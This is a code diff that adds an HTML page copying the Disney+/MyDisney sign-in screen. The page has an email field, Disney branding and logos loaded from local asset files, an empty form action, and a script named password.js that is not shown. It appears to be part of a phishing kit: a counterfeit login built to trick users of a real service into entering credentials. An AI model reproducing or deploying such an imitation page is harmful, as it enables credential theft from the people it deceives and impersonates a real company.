@@ -1,0 +1,105 @@
+<html lang="">
+
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width initial-scale=1" name="viewport" />
+    <title>Login - Email</title>
+    <link rel="icon" href="./assets/ico.png">
+    <link rel="stylesheet" href="./assets/css/styles.css">
+</head>
+
+<body>
+    <div id="root">
+        <div data-focus-guard="true" tabindex="0"
+            style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;">
+        </div>
+        <div data-focus-guard="true" tabindex="1"
+            style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;">
+        </div>
+        <div data-focus-lock-disabled="false">
+            <div class="lightbox-bg modal d-block branded" tabindex="-1">
+                <div class="actions-bar">
+                </div>
+                <div class="modal-dialog" role="dialog" aria-modal="true" aria-labelledby="Title">
+                    <header class="header">
+                        <div aria-label="theme account" class="logo logo-primary" data-testid="-logo" id="logo"
+                            role="img"></div>
+                    </header>
+                    <div class="modal-content view view-starry-night bottom-grow">
+                        <div class="modal-body">
+                            <form class="d-grid gap-4 identity-flow" novalidate="" id="emailForm" method="post"
+                                action="">
+                                <div class="d-grid gap-2">
+                                    <img src="./assets/svg/6.svg" / style="width: 87px;">
+                                    <h1 class="title" id="Title" tabindex="0"><span role="text">Enter your email address
+                                            to continue</span></h1>
+                                    <p class="text-block description" id="TextBlock" data-testid="TextBlock">Log in to
+                                        Disney+ with your MyDisney account. If you don't have one, you will be prompted
+                                        to create one.</p>
+                                </div>
+                                <div data-testid="InputIdentityFlowValue-wrapper"
+                                    class="input-text input-text-InputIdentityFlowValue" for="InputIdentityFlowValue">
+                                    <div data-testid="InputIdentityFlowValue-container"
+                                        class="form-group form-floating input-wrapper">
+                                        <input autofocus class="input-InputIdentityFlowValue form-control" type="email"
+                                            autocomplete="email" autocorrect="off" spellcheck="false" tabindex="0"
+                                            id="InputIdentityFlowValue" name="InputIdentityFlowValue"
+                                            data-testid="InputIdentityFlowValue" placeholder="Email"
+                                            aria-invalid="false" aria-required="true" required value="">
+                                        <p id="errorMessage" class="text-block description"
+                                            style="color:red; display:none;">Please enter a valid email address.</p>
+                                        <label for="InputIdentityFlowValue" aria-hidden="true">Email</label>
+                                    </div>
+                                </div>
+                                <div class="d-grid gap-2">
+                                    <button type="submit" class="btn btn-submit btn-primary" id="BtnSubmit"
+                                        data-testid="BtnSubmit" tabindex="0">Continue</button>
+                                </div>
+                                <div id="LearnMore" aria-expanded="false"
+                                    class="learn-more LearnMoreIdentityFlow accordion accordion-flush">
+                                    <div class="accordion-item">
+                                        <div class="accordion-collapse collapse show">
+                                            <div class="accordion-body">
+                                                <h3 class="title"></h3>
+                                                <p class="description">
+                                                    MyDisney lets you seamlessly log in to services and experiences
+                                                    across The Walt Disney Family of Companies, such as Disney+, ESPN,
+                                                    Walt Disney World,
+                                                    <a target="_blank" rel="noopener" href="?"
+                                                        tracked-link="AND_MORE_LINK">and more.</a>
+                                                </p>
+                                                <div id="logo-parade" data-testid="logo-parade"
+                                                    class="footerLogos text-left">
+
+                                                    <img src="./assets/svg/7.svg" class="svg-color" />
+                                                    <img src="./assets/svg/8.svg" />
+                                                    <img src="./assets/svg/9.svg" />
+                                                    <img src="./assets/svg/10.svg" />
+                                                    <img src="./assets/svg/11.svg" />
+                                                    <img src="./assets/svg/12.svg" />
+                                                    <img src="./assets/svg/13.svg" />
+                                                    <img src="./assets/svg/14.svg" />
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                            <span class="session-id" tabindex="-1">
+                                <input autocapitalize="none" autocomplete="off" autocorrect="off"
+                                    data-testid="session-id" id="session-id" placeholder="session-id" spellcheck="false"
+                                    tabindex="-1" type="text" value="" />
+                            </span>
+                            <div class="global-overlay" role="alert">
+                                <div class="loading-container"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="./assets/js/password.js"></script>
+</body>
+
+</html>
